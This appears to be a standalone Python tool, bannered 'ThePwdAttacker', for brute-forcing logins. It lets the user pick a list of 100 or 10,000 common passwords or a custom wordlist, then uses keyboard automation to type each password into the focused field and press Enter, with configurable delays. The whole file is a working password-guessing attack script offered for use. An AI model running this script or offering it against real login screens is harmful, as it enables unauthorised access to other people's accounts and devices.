from pynput.keyboard import Controller, Key, Listener
from time import sleep

print("\n", "")
print(r"""/$$$$$$$$ /$$                 /$$$$$$$                      /$$  /$$$$$$    /$$     /$$                         /$$                          
|__  $$__/| $$                | $$__  $$                    | $$ /$$__  $$  | $$    | $$                        | $$                          
   | $$   | $$$$$$$   /$$$$$$ | $$  \ $$ /$$  /$$  /$$  /$$$$$$$| $$  \ $$ /$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$$| $$   /$$  /$$$$$$   /$$$$$$ 
   | $$   | $$__  $$ /$$__  $$| $$$$$$$/| $$ | $$ | $$ /$$__  $$| $$$$$$$$|_  $$_/|_  $$_/   |____  $$ /$$_____/| $$  /$$/ /$$__  $$ /$$__  $$
   | $$   | $$  \ $$| $$$$$$$$| $$____/ | $$ | $$ | $$| $$  | $$| $$__  $$  | $$    | $$      /$$$$$$$| $$      | $$$$$$/ | $$$$$$$$| $$  \__/
   | $$   | $$  | $$| $$_____/| $$      | $$ | $$ | $$| $$  | $$| $$  | $$  | $$ /$$| $$ /$$ /$$__  $$| $$      | $$_  $$ | $$_____/| $$      
   | $$   | $$  | $$|  $$$$$$$| $$      |  $$$$$/$$$$/|  $$$$$$$| $$  | $$  |  $$$$/|  $$$$/|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$| $$      
   |__/   |__/  |__/ \_______/|__/       \_____/\___/  \_______/|__/  |__/   \___/   \___/   \_______/ \_______/|__/  \__/ \_______/|__/      
                                                                                                                                              """)

print("\n", end="")
print("1) 100 common passwords attack\n2) 10000 common passwords attack\n3) Custom wordlist\nx) Exit")
option = input("option: ")

if option == "1":
	with open("prewordlists/100_passwords.txt", "r") as file:
		keyboard = Controller()
		content = file.read().split("\n")
		delay1 = input("Enter the typing delay (enter=0.2): ")
		delay2 = input("Enter the delay after pressing enter (enter=0.8):")
		if not delay1:
			delay1 = 0.2
		if not delay2:
			delay2 = 0.8

		print("Press F2 to continue!")
		def attack():
			for i in content:
				for j in i:
					sleep(float(delay1))
					keyboard.press(j)
					keyboard.release(j)
				keyboard.press(Key.enter)
				keyboard.release(Key.enter)
				sleep(float(delay2))

		def on_release(key):
			if key == Key.f2:
				attack()
				return False

		with Listener(on_release=on_release) as listener:
			listener.join()
elif option == "2":
	with open("prewordlists/10000_passwords.txt", "r") as file:
		keyboard = Controller()
		content = file.read().split("\n")
		delay1 = input("Enter the typing delay (enter=0.2): ")
		delay2 = input("Enter the delay after pressing enter (enter=0.8):")
		if not delay1:
			delay1 = 0.2
		if not delay2:
			delay2 = 0.8

		print("Press F2 to continue!")
		def attack():
			for i in content:
				for j in i:
					sleep(float(delay1))
					keyboard.press(j)
					keyboard.release(j)
				keyboard.press(Key.enter)
				keyboard.release(Key.enter)
				sleep(float(delay2))

		def on_release(key):
			if key == Key.f2:
				attack()
				return False

		with Listener(on_release=on_release) as listener:
			listener.join()
elif option == "3":
	filename = input("Enter the filename: ")
	with open(filename, "r") as file:
		keyboard = Controller()
		content = file.read().split("\n")
		delay1 = input("Enter the typing delay (enter=0.2): ")
		delay2 = input("Enter the delay after pressing enter (enter=0.8):")
		if not delay1:
			delay1 = 0.2
		if not delay2:
			delay2 = 0.8

		print("Press F2 to continue!")

		def attack():
			for i in content:
				for j in i:
					sleep(float(delay1))
					keyboard.press(j)
					keyboard.release(j)
				keyboard.press(Key.enter)
				keyboard.release(Key.enter)
				sleep(float(delay2))

		def on_release(key):
			if key == Key.f2:
				attack()
				return False

		with Listener(on_release=on_release) as listener:
			listener.join()
elif option == "x":
        exit()
